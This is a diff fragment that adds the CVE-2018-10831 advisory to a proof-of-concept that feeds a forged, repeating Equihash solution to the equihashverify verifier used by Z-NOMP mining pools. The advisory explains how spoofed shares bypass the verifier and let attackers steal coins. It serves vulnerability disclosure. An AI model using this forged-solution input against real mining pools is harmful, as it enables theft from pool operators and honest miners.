@@ -47,3 +47,90 @@ header = Buffer(‘0400000008e9694cc2120ec1b5733cc12687b609058eec4f7046a521ad1d1
 soln = Buffer(‘0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f0000f80007c0003e0001f’, ‘hex’);
 
 console.log(ev.verify(header, soln));
+
+>CVE-2018-10831
+> [Suggested description]
+> Z-NOMP before 2018-04-05
+> has an incorrect Equihash solution verifier
+> that allows attackers to spoof mining shares, as demonstrated by
+> providing a solution with {x1=1,x2=1,x3=1,...,x512=1} to bypass this verifier for any blockheader.
+> This originally affected (for example) the Bitcoin Gold and Zcash cryptocurrencies, and continued to
+> be
+> exploited in the wild in May 2018 against smaller cryptocurrencies.
+> 
+> ------------------------------------------
+> 
+> [Additional Information]
+> Recently, we detected a new type of attack which targets some equihash
+> mining pools. After analysis, we found out the attacked equihash
+> mining pools are using a vulnerable equihash verifier (equihashverify
+> : https://github.com/joshuayabut/equihashverify) to verify miners'
+> shares. There is a are is logic bugs logic vulnerability in this
+> verifier, so attacker can easily fake mining shares which can bypass
+> the equihash solution verifier without using so much computing power.
+> This vulnerability has a wide impact because the verifier
+> (equihashverify) is previously used by the zcash official open source
+> mining pool (node-stratum-pool), and many new cryptocurrencies which
+> use equihash as PoW algorithm are forked from this pool.
+> 
+> ------------------------------------------
+> 
+> [VulnerabilityType Other]
+> Incorrect validation
+> 
+> ------------------------------------------
+> 
+> [Vendor of Product]
+> zencash and many other altcoin
+> 
+> ------------------------------------------
+> 
+> [Affected Product Code Base]
+> Z-nomp - version before  Apr 05, 2018
+> 
+> ------------------------------------------
+> 
+> [Affected Component]
+> Zcash's Z-nomp mining pool, and many other pools of altcoin which use equihash as POW
+> 
+> ------------------------------------------
+> 
+> [Attack Type]
+> Remote
+> 
+> ------------------------------------------
+> 
+> [CVE Impact Other]
+> Attacker can easily fake mining shares which can bypass the equihash solution verifier without using so much computing power. Then he can stole coins from the pool
+> 
+> ------------------------------------------
+> 
+> [Attack Vectors]
+> Recently, we detected a new type of attack which targets some equihash
+> mining pools. After analysis, we found out the attacked equihash
+> mining pools are using a vulnerable equihash verifier (equihashverify
+> : https://github.com/joshuayabut/equihashverify) to verify miners'
+> shares. There is a are is logic bugs logic vulnerability in this
+> verifier, so attacker can easily fake mining shares which can bypass
+> the equihash solution verifier without using so much computing power.
+> This vulnerability has a wide impact because the verifier
+> (equihashverify) is previously used by the zcash official open source
+> mining pool (node-stratum-pool), and many new cryptocurrencies which
+> use equihash as PoW algorithm are forked from this pool.
+> 
+> ------------------------------------------
+> 
+> [Reference]
+> https://github.com/edwardz246003/misc/blob/master/Attackers%20Fake%20Computational%20Power%20to%20Steal%20Cryptocurrencies%20from%20Mining%20Pools.md
+> https://blog.zencash.com/update-for-the-equihash-mining-application-z-nomp/
+> 
+> ------------------------------------------
+> 
+> [Has vendor confirmed or acknowledged the vulnerability?]
+> true
+> 
+> ------------------------------------------
+> 
+> [Discoverer]
+> zhiniang peng from 360 core security
+
